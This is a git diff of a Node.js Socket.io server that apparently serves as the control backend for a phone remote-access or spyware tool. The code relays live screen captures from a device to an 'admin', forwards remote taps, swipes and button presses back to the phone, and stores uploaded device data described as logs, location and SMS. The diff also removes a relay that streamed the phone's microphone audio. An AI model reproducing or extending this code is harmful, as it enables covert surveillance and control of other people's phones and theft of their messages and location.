@@ -4,20 +4,20 @@ const path = require('path');
 const cors = require('cors');
 const bodyParser = require('body-parser');
 const cloudinary = require('cloudinary').v2;
-const http = require('http'); // ✅ HTTP Server
-const { Server } = require("socket.io"); // ✅ Socket.io for Realtime
+const http = require('http'); // ✅ NEW: HTTP Server
+const { Server } = require("socket.io"); // ✅ NEW: Socket.io for Realtime
 
 const app = express();
-const server = http.createServer(app); // ✅ Wrap Express
+const server = http.createServer(app); // ✅ Wrap Express in HTTP Server
 const PORT = process.env.PORT || 3000;
 
-// ✅ SOCKET.IO SETUP
+// ✅ SOCKET.IO SETUP (Live Control Ke Liye)
 const io = new Server(server, {
     cors: {
-        origin: "*",
+        origin: "*", // Kisi bhi website se allow karega
         methods: ["GET", "POST"]
     },
-    maxHttpBufferSize: 1e8 // 100MB buffer (Screen + Audio ke liye zaroori)
+    maxHttpBufferSize: 1e8 // 100MB buffer for heavy screen data
 });
 
 // --- 1. CLOUDINARY CONFIG ---
@@ -39,45 +39,31 @@ app.use(express.static(__dirname));
 // Live Status (RAM Storage)
 let devicesStatus = {}; 
 
-// ==================================================
-// 🔥 3. SOCKET.IO LOGIC (MAIN CONTROL CENTER)
-// ==================================================
+// --- 3. SOCKET.IO LOGIC (🔥 LIVE SCREEN & CONTROL) ---
 io.on('connection', (socket) => {
     console.log('🔌 New Connection:', socket.id);
 
-    // 1. Join Room (Device aur Admin same ID se connect honge)
+    // 1. Join Room (Device aur Admin dono same ID se join karenge)
     socket.on('join', (roomID) => {
         socket.join(roomID);
         console.log(`🔗 Socket Joined Room: ${roomID}`);
     });
 
     // 2. SCREEN SHARE (Device -> Admin)
+    // Phone screen ki images bhejega, hum admin ko forward karenge
     socket.on('screen-data', (data) => {
         const { room, image } = data;
-        // Sirf admin ko forward karo
+        // Sirf us room me bhejo (Admin ko milega)
         socket.to(room).emit('screen-data', image);
     });
 
-    // 3. ✅ AUDIO STREAM (Device -> Admin) [ADDED THIS]
-    // Ye missing tha, ab Mic ka data Admin tak jayega
-    socket.on('audio-stream', (room, data) => {
-        socket.to(room).emit('audio-stream', data);
-    });
-
-    // 4. REMOTE CONTROL & BUTTONS (Admin -> Device)
-    // Works for: Click, Swipe, Back, Home, Recent
+    // 3. REMOTE CONTROL (Admin -> Device)
+    // Admin click/swipe karega, hum phone ko forward karenge
     socket.on('control-event', (data) => {
         const { room, action, x, y, key } = data; 
-        
-        // Log taaki terminal me dikhe ki button dab raha hai
-        if (action === 'global-action') {
-            console.log(`🔘 Button Pressed: ${key} on ${room}`);
-        } else {
-            console.log(`👆 Touch Action: ${action} on ${room}`);
-        }
-
-        // Phone ko command forward karo
+        // Action: 'click', 'swipe', 'home', 'back'
         socket.to(room).emit('control-event', { action, x, y, key });
+        console.log(`🎮 Control Event to ${room}: ${action}`);
     });
 
     socket.on('disconnect', () => {
@@ -87,7 +73,7 @@ io.on('connection', (socket) => {
 
 // --- 4. ROOT ROUTE ---
 app.get('/', (req, res) => {
-    res.send('✅ Server is Running (Socket.io Active for Audio & Screen)!');
+    res.send('✅ Server is Running (Socket.io Active for Live Control)!');
 });
 
 // ==================================================
@@ -185,7 +171,7 @@ app.post('/api/send-command', (req, res) => {
 });
 
 // ==================================================
-//  DATA STORAGE (Logs, Location, SMS)
+//  🔥 DATA STORAGE
 // ==================================================
 
 app.post('/api/upload_data', (req, res) => {
@@ -240,5 +226,5 @@ app.get('/api/get-data/:device_id/:type', (req, res) => {
     else res.json([]);
 });
 
-// ✅ SERVER START
+// ✅ IMPORTANT: "server.listen" instead of "app.listen" for Socket.io
 server.listen(PORT, () => console.log(`🔥 SERVER RUNNING ON PORT ${PORT} WITH SOCKET.IO`));
